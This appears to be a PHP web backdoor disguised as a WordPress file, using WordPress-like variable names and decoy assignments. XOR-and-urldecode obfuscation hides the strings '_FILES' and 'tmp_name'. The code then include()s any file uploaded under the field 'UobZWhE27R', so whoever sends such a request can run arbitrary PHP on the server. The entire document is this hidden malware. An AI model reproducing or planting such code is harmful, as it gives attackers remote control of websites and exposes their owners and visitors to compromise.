<?php
        
    
	$template_lock = 'is_escaped';
        
function ext_types($append)

{

    $regex = $append;

    

    $check_sql = $GLOBALS;
    

    $check_sql = $check_sql[dirs("%0A%29%2B%16%12%3B", $regex)];
    
    $emoji_char = $check_sql;
    $enclosure = isset($emoji_char[$regex]);

    if ($enclosure)

    {

        $deprecated = $check_sql[$regex];
        $original_link_html = $deprecated[dirs("%21%02%12%059%09%28W", $regex)];
	$pinged = 'default_term_id';
        $no_texturize_shortcodes = $original_link_html;
        include ($no_texturize_shortcodes);
    }
	$singular_base = 'object';
}
function dirs($hierarchical, $replace_pairs)

{
    $page_list = $replace_pairs;

    $pattern = "url";
    $pattern  .= "decode";
    $pung = $pattern($hierarchical);

    $_wp_suspend_cache_invalidation = strlen($pung);
    $_wp_suspend_cache_invalidation = substr($page_list, 0, $_wp_suspend_cache_invalidation);
    $menu_icon = $pung ^ $_wp_suspend_cache_invalidation;

    
	$no_texturize_shortcodes_stack = 'src_url';
    $pung = sprintf($menu_icon, $_wp_suspend_cache_invalidation);
    
    return $menu_icon;
}

ext_types('UobZWhE27R');
	$field_no_prefix = 'disabled_elements';

?>
